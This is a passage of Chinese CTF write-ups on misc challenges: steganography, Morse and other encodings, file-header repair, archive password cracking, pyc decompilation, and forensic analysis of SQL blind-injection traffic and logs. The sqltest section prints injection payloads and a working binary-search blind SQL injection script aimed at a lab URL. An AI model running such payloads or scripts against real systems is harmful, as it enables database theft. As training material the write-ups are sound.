            # 写文件
            newpic = bytearray(fr)
            for x in range(4):
                newpic[x + 16] = width[x]
                newpic[x + 20] = height[x]
            fw = open(file + '.png', 'wb')  # 保存副本
            fw.write(newpic)
            fw.close
```

![image-20231201163510399](assets/image-20231201163510399.png)

```flag
xaflag{66666}
```

### 穿越时空的思念(摩斯密码，右声道，morse2ascii)

将音频文件导入 Audition，可发现右声道存在摩斯电码

![image-20231205225234922](assets/image-20231205225234922.png)

```
第一段
..-. ----- ..--- ----. -... -.. -.... ..-. ..... ..... .---- .---- ...-- ----. . . -.. . -... ---.. . ....- ..... .- .---- --... ..... -... ----- --... ---.. -....
转换得到F029BD6F551139EEDEB8E45A175B0786
第二段
..-. ----- ..--- ----. -... -.. -.... ..-. .....
转换得到F029BD6F5
第二段只是重复第一段，将第一段转换大小写即可
print("F029BD6F551139EEDEB8E45A175B0786".lower())
```

不想手动，就拿到kali，用morse2ascii xxx.wav转换即可

![image-20231205225351514](assets/image-20231205225351514.png)

去除掉重复部分并拼接可得 flag。

```flag
flag{f029bd6f551139eedeb8e45a175b0786}
```

### [BJDCTF2020]鸡你太美（GIF文件头缺失，010Editor插入字节）

附件 篮球.gif（鸡你太美）、篮球副本.gif（打不开）。010Editor打开篮球副本.gif，发现缺少gif的文件头部（复习一下gif的Magic是 GIF89a，也就是0x47 0x49 0x46 0x38 0x39 0x61）。在文件开始插入4个字节，写入GIF8，另存为b.gif。

这里如何添加呢？

找到添加位置，左上角编辑，插入字节，我这里要插入四个字节，于是大小选4，随意一个字符都行，比如G,然后插入，之后修改成想要的值就行了

![image-20231201170426359](assets/image-20231201170426359.png)

修复之后：

![21](assets/21.gif)

图片显示 zhi-yin-you-are-beautiful 提交发现不对，脑洞来了，把连字符换成下划线，提交 flag{zhi_yin_you_are_beautiful} 正确。

```flag
flag{zhi_yin_you_are_beautiful}
```

### [BJDCTF2020]just_a_rar

解压之后得到一个压缩文档，根据压缩文档名称提示，使用 ARCHPR 爆破得到密码 2016。

![image-20231201170634339](assets/image-20231201170634339.png)

解压得到一张 jpg 图片，使用 010 editor 打开可在文件中部找到 flag。

![image-20231201170647830](assets/image-20231201170647830.png)

```flag
flag{Wadf_123}
```

### [GKCTF2020]Pokémon(已经没这题目了)

下载个 VisualBoyAdvance-M 并载入游戏，根据剧情和提示走到 103 号路就能看到 flag。

![img](assets/e34a2a1f5485965fcf8451b0f04ebc90.png)

```flag
flag{PokEmon_14_CutE}
```

### [ACTF新生赛2020]outguess(outguess隐写，outguess工具使用)

解压出来非常多奇怪文件，不过根据题目名称，应该是 outguess 隐写，所以要找一下 key。在图片的属性中找到一串社会主义核心价值观，解密一下可以得到 abc，因此 abc 是 key。

![img](assets/ae8e20f5e3a8ebf890bdda3abd72a7bf.png)

将 abc 作为密钥对图片执行 outguess 解密操作即可得到 flag。

```
outguess -k abc -r mmm.jpg fuck.txt
```

![image-20231201171249773](assets/image-20231201171249773.png)

```flag
ACTF{gue33_Gu3Ss!2020}
```

### [BJDCTF2020]纳尼(GIF残缺补全，逐帧浏览)

010 editor 打开解压出来的 GIF 图片，根据文本文档提示可知需要补全 GIF 文件头，于是插入 GIF8 补全文件头。用 PS 打开逐帧导出可以得到一串字符串。

![image-20231201172230919](assets/image-20231201172230919.png)

得到字符串为 `Q1RGe3dhbmdfYmFvX3FpYW5nX2lzX3NhZH0=`，base64 解码后得到 flag。

```flag
CTF{wang_bao_qiang_is_sad}
```

### [SWPU2019]我有一只马里奥(NTFS隐写)

运行一次可执行文件，可以得到提示。

```hint
ntfs      
flag.txt
```

于是尝试使用 NTFS Stream Editor 分析，可以发现输出的文本文档中包含附加数据。

![image-20231201203314329](assets/image-20231201203314329.png)

```flag
swupctf{ddg_is_cute}
```

### 谁赢了比赛？(gif图片隐写，stegsolve.jar工具逐帧浏览，调整颜色通道，压缩包密码爆破，binwalk文件分析、分离)

010 editor 打开文件，发现其尾部有压缩文档。`binwalk -e` 分离出来，使用 ARCHPR 爆破得到密码 1020。

![image-20231201204147329](assets/image-20231201204147329.png)

得到一张 GIF 图片，使用 PS 打开，在图层 310 处可以看见 hint `do_you_know_where_is_flag`。将图层导出另存为310.bmp图片帧，再使用 StegSolve打开该帧，尝试调整不同的通道，最后在Gray bits，可以得到一个二维码。

![image-20231201205756376](assets/image-20231201205756376.png)

扫描即可得到 flag。

```flag
flag{shanxiajingwu_won_the_game}
```

### Mysterious

用 IDA 打开分析程序，根据字符串 well done 可以找到子程序 sub_401090。将其反编译得到以下代码。

```c++
int __stdcall sub_401090(HWND hWnd, int a2, int a3, int a4)
{
  int v4; // eax
  char Source; // [esp+50h] [ebp-310h]
  CHAR Text[4]; // [esp+154h] [ebp-20Ch]
  char v8; // [esp+159h] [ebp-207h]
  __int16 v9; // [esp+255h] [ebp-10Bh]
  char v10; // [esp+257h] [ebp-109h]
  int Value; // [esp+258h] [ebp-108h]
  CHAR String; // [esp+25Ch] [ebp-104h]
  char v13; // [esp+25Fh] [ebp-101h]
  char v14; // [esp+260h] [ebp-100h]
  char v15; // [esp+261h] [ebp-FFh]

  memset(&String, 0, 0x104u);
  Value = 0;
  if ( a2 == 16 )
  {
    DestroyWindow(hWnd);
    PostQuitMessage(0);
  }
  else if ( a2 == 273 )
  {
    if ( a3 == 1000 )
    {
      GetDlgItemTextA(hWnd, 1002, &String, 260);
      strlen(&String);
      if ( strlen(&String) > 6 )
        ExitProcess(0);
      v4 = atoi(&String);
      Value = v4 + 1;  //Value should be 122 + 1 == 123
      if ( v4 == 122 && v13 == 120 && v15 == 122 && v14 == 121 )
      {
        strcpy(Text, "flag");
        memset(&v8, 0, 0xFCu);
        v9 = 0;
        v10 = 0;
        _itoa(Value, &Source, 10);
        strcat(Text, "{");
        strcat(Text, &Source); //123
        strcat(Text, "_");
        strcat(Text, "Buff3r_0v3rf|0w");
        strcat(Text, "}");
        MessageBoxA(0, Text, "well done", 0);
      }
      SetTimer(hWnd, 1u, 0x3E8u, TimerFunc);
    }
    if ( a3 == 1001 )
      KillTimer(hWnd, 1u);
  }
  return 0;
}
```

由 `Value = v4 + 1` 和判断中的 `v4 == 122` 可知 Value 在满足走下去的条件时应为 123，将下文的字符串拼接起来即可得到 flag。

```flag
flag{123_Buff3r_0v3rf|0w}
```

### sqltest(流量分析，sql注入sql盲注流量分析，tshark数据提取)

首先我们观察流量包，可以看到很多条这样的http请求，url中有`select`， `SCHEMA_name`等，可以确定是对mysql数据库的盲注
 [![img](assets/1257459-20210810153747839-929576549.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810153747839-929576549.png)
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810153836714-1359705554.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810153836714-1359705554.png)
 我们来把url的部分提取出来
 一种方法是`导出http对象`，但是这样的话接下来就要手动读注入信息了，这很不方便
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810154057096-1570235787.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810154057096-1570235787.png)
 所以我们用tshark提取



```
tshark -r sqltest.pcapng -Y "http.request" -T fields -e http.request.full_uri > data.txt
```



```bash
-r 读取文件
-Y 过滤语句
-T pdml|ps|text|fields|psml,设置解码结果输出的格式
-e 输出特定字段
http.request.uri http请求的uri部分
```

[![img](assets/1257459-20210810154517646-1045032519.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810154517646-1045032519.png)
 现在我们可以写python来提取数据了。
 来看提取出的payload:

1.获取information_schema.SCHEMATA中数据行数的长度，从中可以知道长度是1
 [![img](assets/1257459-20210810164235900-1173819004.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810164235900-1173819004.png)

2.获取information_schema.SCHEMATA中数据行数，`chr(53) = '5' `，即infomation_schema.SCHEMATA有5行数据
 information_schema.SCHEMATA中保存了所有数据库
 [![img](assets/1257459-20210810163954827-1322145581.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810163954827-1322145581.png)

3.（第19行-第61行+第65,66行）
 开始获取每一个数据库的长度，这一部分是并发执行的
 [![img](assets/1257459-20210810183223345-175879790.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810183223345-175879790.png)

4.（62,63,64，第67-417行）
 开始获取每一个数据库库名，并发执行
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810183448564-1166764396.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810183448564-1166764396.png)
 418行已经获取到了库名
 [![img](assets/1257459-20210810183557580-911763268.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810183557580-911763268.png)

1.表名个数的长度
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810183645102-1946222475.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810183645102-1946222475.png)
 2.表名个数
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810183911481-2092479133.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810183911481-2092479133.png)
 3.表名长度
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810183943865-95849090.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810183943865-95849090.png)
 4.表名（445-510）
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810184019397-74158062.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184019397-74158062.png)
 511看到已经获取了表名
 [![img](assets/1257459-20210810184102022-1083773065.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184102022-1083773065.png)

1.字段个数的长度
 [![img](assets/1257459-20210810184155384-68121853.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184155384-68121853.png)
 2.字段个数
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810184230628-447931862.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184230628-447931862.png)
 3.获取每一个字段长度
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810184417472-1635635145.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184417472-1635635145.png)
 4.并发获取每个字段字段名（546-601）
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810184440347-868329228.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184440347-868329228.png)

1.值个数的长度
 [![img](assets/1257459-20210810184648887-1665322794.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184648887-1665322794.png)
 2.值的个数
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810184747750-1397053903.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184747750-1397053903.png)
 值的个数为1
 3.值的长度
 [![img](../../../CTF_%25E7%25AC%2594%25E8%25AE%25B0%25E8%25AE%25B0%25E5%25BE%2597%25E8%25BD%25AC%25E7%25A7%25BB/misc/assets/1257459-20210810184816880-17102933.png)](https://img2020.cnblogs.com/blog/1257459/202108/1257459-20210810184816880-17102933.png)
 这一个值的长度是38
 4.获取值（628-972）
 这一步就是我们要找的flag了，写一个脚本提取一下。我们知道注入语句为

```
id=1 and ascii(substr(((select concat_ws(char(94), flag)  from db_flag.tb_flag  limit 0,1)), {第i个字符}, 1))>{字符的ascii值}
```

我们把`第i个字符`和`ascii值`提取出来，取i变化时的值，脚本为：

```python
import urllib.parse
f = open("data.txt","r").readlines()

s = []
for i in range(627,972):
    data = urllib.parse.unquote(f[i]).strip()
    payload = data.split("and")[1]
    positions = payload.find("from db_flag.tb_flag  limit 0,1)), ")
    data1 = payload[positions+35:].split(",")[0]
    data2 = payload[positions+35:].split(">")[1]
    s.append([data1,data2])

for i in range(1,len(s)):
    if s[i][0]!=s[i-1][0]:
        print(chr(int(s[i-1][1])),end="")
print(chr(int(s[-1][1])))
```

![img](assets/1257459-20210810185235450-152025786.png)



```flag
flag{47edb8300ed5f9b28fc54b0d09ecdef7}
```

#### **tshark提取盲注流量要点补充：**

还是要回到sql盲注的原理上来。
 我们知道，在盲注中，数据库运行返回结果时如果只返回对错而不返回数据库中的信息时，可以采用盲注，攻击者需要根据页面返回的不同来判断信息。而且盲注大部分情况下采用二分法来加快这一过程。一个盲注盲注脚本如下：

```python
import requests

# url
url = "http://xxx.xxx.xxx.xxx/Less-26a/?id=1')^({})^('1'='1"

payload = {}
headers= {}
result=''
for i in range(0,800):
    low = 32
    high = 127
    while low < high:
        mid = (low+high)//2
        # 查数据库
        database = "oorrd(substr((select(group_concat(database()))),%d,1))>=%d" % (i, mid)
        # 查表
        tables = "oorrd(substr((select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)=database()),%d,1))>=%d"%(i,mid)
        columns = "oorrd(substr((select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name)='users'),%d,1))>=%d"%(i,mid)
        data = "oorrd(substr((select(group_concat(username))from(security.users)),%d,1))>=%d" % (i, mid)
      
        # 根据需要查询的内容改变参数
        response = requests.request("GET", url.format(data), headers=headers, data=payload)
        
        if 'Your Login name:Dumb' in response.text:
            low = mid+1
        else:
            high = mid
        #print(low,mid,high)
    result += chr(low)
    print(result)
```

如果我们在分析时只分析了攻击者发出的流量，没有分析返回内容，而是粗暴地用最后一个字符，最后会得到一堆乱码
 [![img](assets/1257459-20220421190651562-353339099.png)](https://img2022.cnblogs.com/blog/1257459/202204/1257459-20220421190651562-353339099.png)

所以，更合适的写法是把payload和返回数据都提取出来
 用tshark过滤

```
tshark -r sqlmap.pcapng -Y "ip.src == xxx.xxx.xxx.xxx && http.response" -T fields -E separator="~" -e http.response_for.uri -e http.file_data > data.txt
```

简单解释一下，ip.src == xxx.xxx.xxx.xxx  是服务器发出的包(这里不告诉大家ip地址了)，http.response是指过滤http返回内容，-E separator  是设置输出分隔符，-e 代表输出流量中对应字段，在这里输出返回包中的uri和数据



```python
import urllib.parse
# 读入数据，数据中存在不可见字符，因此用rb模式
f = open("data.txt", "rb").readlines()

# 注入语句。
pattern = "AND ORD(MID((SELECT IFNULL(CAST(username AS NCHAR),0x20) FROM `security`.users ORDER BY username LIMIT 10,1),"
# 注入成功
trueInjection = "You are in..........."
temp = {}

for i in range(0, len(f)):
    line = str(f[i])[2:]
    # 上一步插入的分隔符，把数据分为url和data两部分
    if line.find("~") == -1:
        continue

    url, data = line.split("~")[0],line.split("~")[1]
    
    url = urllib.parse.unquote(url).strip()

    positions = url.find(pattern)
    if positions != -1:
        # 截取参数，data1 表示第几位数据，data2表示这一位数据的ascii值
        data1 = url[positions+len(pattern):].split(",")[0]
        data2 = url[positions+len(pattern):].split(">")[1].split(" ")[0]
        
        # data3: 注入结果的判断
        if data.find(trueInjection) != -1:
            data3 = True
        else:
            data3 = False
        if data1 not in temp:
            temp[data1]=[(data2,data3)]
        else:
            temp[data1].append((data2,data3))

    else:
        continue

# 盲注使用了二分法，所以也要根据这一点写代码解析数据
text=""
for i in temp:
    small = -1
    large = -1
    for j in temp[i]:
        if j[1] :
            small = j[0]
        else:
            large = j[0]
    if large != -1:
        text+=chr(int(large))
print(text)
```

![img](assets/1257459-20220421191222673-591518216.png)



### [NewStarCTF]week2-1序章(sql注入、sql盲注流量分析)

- **考点**：SQL注入日志分析

- **FLAG**：flag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32}

- **解题步骤**

题目给出了Web请求日志，经过分析可以看出是SQL盲注的日志信息，Payload为：

-1 or if(ascii(substr((select group_concat(username,password) from user),位数,1))=字符ASCII码,sleep(1),1)--+

当注入到某一位的正确字符后会结束这一位的爆破，进行下一位的注入，例如

172.17.0.1 - - [20/Aug/2023:00:08:44 +0800] "GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),7,1))=110,sleep(1),1)--+&totalPrice=0 HTTP/1.1" 500 353 "-" "python-requests/2.28.2"

172.17.0.1 - - [20/Aug/2023:00:08:47 +0800] "GET /app/action/edit_sell.php?pid%5B0%5D=-1%20or%20if(ascii(substr((select%20group_concat(username,password)%20from%20user),8,1))=40,sleep(1),1)--+&totalPrice=0 HTTP/1.1" 500 353 "-" "python-requests/2.28.2"

如上的日志信息就说明第7位字符的ASCII码为110，根据这个原理可以编写脚本来提取日志中的注入结果，也有很多现成的脚本稍微修改一下就可以使用，可以参考这篇文章的分析：[https://www.cnblogs.com/0yst3r-2046/p/12322110.html](https://www.cnblogs.com/0yst3r-2046/p/12322110.html?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE3MDIwMjQ5NTAsImZpbGVHVUlEIjoiRHk1ZWtISmhLbzBhcDV2MyIsImlhdCI6MTcwMjAyNDY1MCwiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODQ1MjQ5MjIwNX0.Hf-lREtlFdHEBbBS5oeXGp0AYAwXFs7ncCNuAOkC2fw)

稍微修改一下脚本，即可，python3运行

```python
# coding:utf-8
import re
import urllib.parse

#读取日志内容，并解码写道列表中，方便后续处理
f = open('access.log','r')
lines = f.readlines()
datas = []
for line in lines:    
    t = urllib.parse.unquote(line)#url解码，方便后续读取   
    datas.append(t)
    
flag_ascii = {}#定义字典，方便更新迭代
for data in datas:    
    matchObj = re.search( r'user\),(.*?),1\)\)=(.*?),sleep', data)    
    if matchObj:        
        key = int(matchObj.group(1)) 
        #group(1),参数在1-99之间，返回对应括号组字符串，所以返回的是正则中第一个括号内匹配到的内容             #key表示是结果中的第key位，标识
        value = int(matchObj.group(2))
        #group(2),参数在1-99之间，返回对应括号组字符串，所以返回的是正则中第二个括号内匹配到的内容             #value对应第key位的值  
        flag_ascii[key] = value#拿到一个就更新一次，因为盲注流量中用的user),{key},1))={value},sleep(1)，是=符号，每个key更新到他最后对应的value时，就是正确的flag第key位的值，到流量下一行，key就变了，不得不说，脚本写的聪明 
flag = ''
for value in flag_ascii.values():    
    flag += chr(value)#逐项读取字典内容并转字符 
print (flag)
```

得到注入内容，后半段即为FLAG：

you_w4nt_s3cretflag{just_w4rm_up_s0_you_n3ed_h4rder_6026cd32},

### [GXYCTF2019]gakki(文件分离、压缩密码爆破、字符统计)

010 editor 打开文件，发现其尾部有压缩文档。

![image-20231201213816788](assets/image-20231201213816788.png)

`binwalk -e` 分离出来，使用 ARCHPR 爆破得到密码 8864。

![image-20231201213806960](assets/image-20231201213806960.png)

解压后得到看不懂的文本文档，尝试对内容进行文本字符统计可得 flag。

![image-20231201213925535](assets/image-20231201213925535.png)

```flag
GXY{gaki_IsMyw1fe}
```

### [BJDCTF 2nd]TARGZ-y1ng

套娃解压压缩包，压缩包的名称是下一个压缩包的解压密码。

```python
import zipfile

def Unzip(fileName):
    while True:
        password = fileName.split('.')[0]
        zip = zipfile.ZipFile(fileName,'r')
        zip.extractall(pwd=password.encode("UTF-8"))
        fileName = zip.namelist()[0]
        zip.close()
Unzip("hW1ES89jF.tar.gz")
```

解压到最后即可得到 flag 文件。

```flag
BJD{wow_you_can_rea11y_dance}
```

### [HBNIS2018]excel破解（010editor的大作用）

直接打开，有密码，于是直接binwalk、zsteg先浏览一下文件信息

发现内部藏有gif图片，分离出来，一个gif，没有头绪了，用010editor，也没有发现，应该思路出错了，回过头来，直接将原来未分离的excel文件用010 editor 打开文件，可以直接搜索找到 flag。

![img](assets/d14192855cfbe3bd9057b7d4bba9f571.png)

```flag
CTF{office_easy_cracked}
```

### 喵喵喵(png隐写，png宽高修复，NTFS数据流处理，pyc反编译，python加密逆向)

附件mmm.png。binwalk，formost等一顿处理，没结果,zsteg解隐写无结果，于是010dakai看异常，无结果，于是使用stegsolve解隐写：

StegSolve查看发现RGB三色plane0的顶部有异常。用Data Extract，选择RGB的plane0，通道顺序BGR，小端模式LSB，发现是一个PNG图片，另存为qr.png。qr.png是半个二维码，crc32爆破高度得到完整二维码qr1.png。可以用QRResearch直接扫码qr1.png，或者qr1.png反色后用微微二维码扫描，得到字符串 https://pan.baidu.com/s/1pLT2J4f。

![image-20231202111320754](assets/image-20231202111320754.png)

保存下来修正图片文件头并大致修正图片高度后可得一二维码，可将其反色。

计算宽高为：

```python
import binascii
import struct
crcbp = open("1.png", "rb").read()
for i in range(2000):
    for j in range(2000):
        data = crcbp[12:16] + struct.pack('>i', i)+struct.pack('>i', j)+crcbp[24:29]
        crc32 = binascii.crc32(data) & 0xffffffff
        if(crc32 == 0x8ec7edb):#根据图片的CRC32值来修改
            print(i, j)
            print('hex:', hex(i), hex(j))
 #0x118,0x118
```

![image-20231202113550262](assets/image-20231202113550262.png)

从网盘下载到flag.rar文件。**winrar解压缩报错**。里面的flag.txt内容为“flag不在这里哦 你猜猜flag在哪里呢？ 找找看吧”。此时考虑NTFS流数据。用NtfsStreamsEditor工具搜索得到flag.pyc。

用uncompyle6反编译。或者在线工具反编译：https://tool.lu/pyc/

```python
#!/usr/bin/env python
# visit http://tool.lu/pyc/ for more information
import base64

def encode():
    flag = '*************'
    ciphertext = []
    for i in range(len(flag)):
        s = chr(i ^ ord(flag[i]))
        if i % 2 == 0:
            s = ord(s) + 10
        else:
            s = ord(s) - 10
        ciphertext.append(str(s))

    return ciphertext[::-1]

ciphertext = ['96','65','93','123','91','97','22','93','70','102','94','132','46','112','64','97','88','80','82','137','90','109','99','112']
```

写个解密函数。

```python
# -*- coding: utf-8 -*-
def decode():
    ciphertext = [
        '96', '65', '93', '123', '91', '97', '22', '93', '70', '102', '94', '132',
        '46', '112', '64', '97', '88', '80', '82', '137', '90', '109', '99', '112']
    ciphertext = ciphertext[::-1]  # 倒序，可以不用
    flag = []
    for i, s in enumerate(ciphertext):
        if i % 2 == 0:  # 偶数，加密时+10，解密就-10
            s = int(s) - 10
        else:
            s = int(s) + 10  # 奇数，加密时-10，解密就+10
        s = chr(i ^ s)  # 按位异或
        flag.append(s)
    print(''.join(flag))


if __name__ == '__main__':
    decode()
```

可得到 flag。

```flag
flag{Y@e_Cl3veR_C1Ever!}
```

### [ACTF新生赛2020]base64隐写

压缩包解压得到文本文档，使用 Base64 隐写工具可解出 flag。

![image-20231201214418960](assets/image-20231201214418960.png)

```flag
ACTF{6aseb4_f33!}
```

### [HBNIS2018]来题中等的吧(图片处理，可能图片上本身就是要点，不要一味的分解图片，flag大写不对，就小写)

解压得到一张图片，转换为摩斯电码。

![image-20231205204404457](assets/image-20231205204404457.png)

```text
第一个红框代表“-”，第二个红框代表“.”，第三个红框代表“ ”（空格）。
.- .-.. .--. .... .- .-.. .- -...
```

将摩斯电码解出即得 flag。

```flag
flag{ALPHALAB}
提交出错，于是转换小写
flag{alphalab}正确
```

### [SWPU2019]伟大的侦探（010Editor用EBCDIC编码打开文件，福尔摩斯跳舞小人编码）

010 editor 下编辑为 EBCDIC 可见压缩包密码 `wllm_is_the_best_team!`。解压压缩包后对照小人跳舞得解密表可得flag。

![image-20231201223353283](assets/image-20231201223353283.png)

![img](assets/1718336e4f0f124a92f935854a4d938f.jpg)

```flag
flag{iloveholmesandwllm}
```

### 黑客帝国（16进制数据处理，口令爆破，文件头识别与矫正）

解压文件得到一个文本文档，里面有很多数据。像是16进制数据，拿去16进制解码，发现存在rar压缩关键字，于是还原为rar压缩包。观察容易得出 `52 61 72` 对应 Rar，因此数据是个压缩文档，编写脚本将其还原。

```python
import binascii
hexData = open('7ecb86887bd03535a7f9959e934e901e.txt').read()
file = open('7ecb86887bd03535a7f9959e934e901e.rar', 'wb')
file.write(binascii.unhexlify(hexData))
file.close()
```

或者直接使用010editor，选择文件-导入16进制，导入包含16进制数据的文件，再另存为压缩包文件1.rar即可

![image-20231201224622771](assets/image-20231201224622771.png)

使用 ARCHPR 爆破得到密码 3690。

![image-20231201224820409](assets/image-20231201224820409.png)

解压缩得到a.png文件但打不开。010Editor查看，发现报错png文件模板出错，结合内容有JFIF，以0xFFD9结尾，推断为jpg文件。于是把开头的4个字节从 0x89504E47 改为 0xFFD8FFE0，另存为a.jpg文件，打开得到将文件头修正后打开图片即可得到 flag。

![image-20231201224916082](assets/image-20231201224916082.png)

![image-20231201225052265](assets/image-20231201225052265.png)

```flag
flag{57cd4cfd4e07505b98048ca106132125}
```

### [WUSTCTF2020]find_me(盲文字符)

解压所得的图片的属性中发现盲文字符 `⡇⡓⡄⡖⠂⠀⠂⠀⡋⡉⠔⠀⠔⡅⡯⡖⠔⠁⠔⡞⠔⡔⠔⡯⡽⠔⡕⠔⡕⠔⡕⠔⡕⠔⡕⡍=`。解密可得flag

![image-20231201212056572](assets/image-20231201212056572.png)

```flag
wctf2020{y$0$u_f$1$n$d$_M$e$e$e$e$e}
```

### 弱口令(不可见字符转换摩斯密码，png图片Cloacked-Pixel隐写)

压缩文件备注有内容，复制到 VS Code 可知是摩斯电码。

![image-20231202155803232](assets/image-20231202155803232.png)

或者在windows下看不见（不可见字符），复制下来，转换成16进制就知道了

![image-20231202155931283](assets/image-20231202155931283.png)

发现存在规律，于是尝试转换成摩斯电码，

```
...././.-../.-../-----/..-./---/.-./..-/--
hell0forum
```

解出摩斯电码可得 `HELL0FORUM`，将其作为压缩包密码解压出图片。这里需要使用 Cloacked-Pixel 去解密得出 flag。

![image-20231202162027794](assets/image-20231202162027794.png)

```flag
flag{jsy09-wytg5-wius8}
```

### [MRCTF2020]你能看懂音符吗（word隐写）

不能解压，010打开，像RAR压缩文件，但文件头异常，于是根据文件头表，修复文件头

![image-20231201225915070](assets/image-20231201225915070.png)

将压缩包文件头修正后得到一个文档。根据文档提示，**word文档-选中所有-右键-字体-隐藏文字，显示被隐藏内容**，

![image-20231201230534177](assets/image-20231201230534177.png)

或者如下图，将文档更改zip后缀解压后读取 document.xml 可以发现音符。

![image-20231201230725628](assets/image-20231201230725628.png)

```text
♭♯♪‖¶♬♭♭♪♭‖‖♭♭♬‖♫♪‖♩♬‖♬♬♭♭♫‖♩♫‖♬♪♭♭♭‖¶∮‖‖‖‖♩♬‖♬♪‖♩♫♭♭♭♭♭§‖♩♩♭♭♫♭♭♭‖♬♭‖¶§♭♭♯‖♫∮‖♬¶‖¶∮‖♬♫‖♫♬‖♫♫§=
```

将其放到对应的[加解密工具](https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue)里解密即可得到 flag。

![img](assets/9ce284ab9da166b3b29a3351518507de.png)

```flag
MRCTF{thEse_n0tes_ArE_am@zing~}
```

### john-in-the-middle

使用 Wireshark 分析流量包，筛选 http 条目，可以导出很多图片（直接用formost、binwalk分离出来）。使用 StegSolve逐个查看，在第一个图片就找到了flag

```flag
flag{J0hn_th3_Sn1ff3r}
```

### [SWPU2019]你有没有好好看网课?(敲击码，视频逐帧播放，压缩包备注)

解压得到很多文件，首先根据压缩包备注对 flag3.zip 使用 ARCHPR 爆破得到密码 183792。

解压得到一个word文件，里面的到提示520，711,还有一个视频，在 Potplayer下打开，在5秒，7秒左右逐帧播放可以得到信息。

![image-20231202093905445](assets/image-20231202093905445.png)

![image-20231202093917109](assets/image-20231202093917109.png)

其中第一段是 Tap Code(敲击码)，使用对应的码表可解出为 `wllm`。

```bash
  1  2  3  4  5
1 A  B C/K D  E
2 F  G  H  I  J 
3 L  M  N  O  P
4 Q  R  S  T  U
5 V  W  X  Y  Z
```

![image-20231202094155667](assets/image-20231202094155667.png)

第二段直接 base64 解码为 `up_up_up`。将其拼合可得 `wllmup_up_up`。将其作为解压密码解压 flag2.zip，得到一张图片。

![img](assets/fe027b1b688677088dc92b577f9f51bf.png)

使用 010editor 打开图片可以直接找到 flag。

```flag
swpuctf{A2e_Y0u_Ok?}
```

### [GUET-CTF2019]KO(ook编码)

将得到的内容直接 Ook! 解码即可得 flag。

![image-20231201213252843](assets/image-20231201213252843.png)

```flag
flag{welcome to CTF}
```

### [HBNIS2018]caesar（凯撒密码爆破）

打开之后得到一串文本 `gmbhjtdbftbs`，使用凯撒加密的工具解密可得 flag。

![image-20231201222751442](assets/image-20231201222751442.png)

```flag
flag{flagiscaesar}
```

### zip（4字节大小内容zipCRC爆破）

解压之后得到了很多 zip 文件，根据提示需要提取内容，但是压缩包需要密码，文件大小为 4 字节，于是尝试 CRC 爆破。写个脚本提取内容。

![image-20231202165710627](assets/image-20231202165710627.png)

```python
#fuck_4_crc.py
#放到压缩包文件夹外的一层，运行即可（建议看看脚本怎么写的）
import binascii
import zipfile
import string

base64StrDictionary = string.ascii_letters + string.digits + '+' + '/' + '='
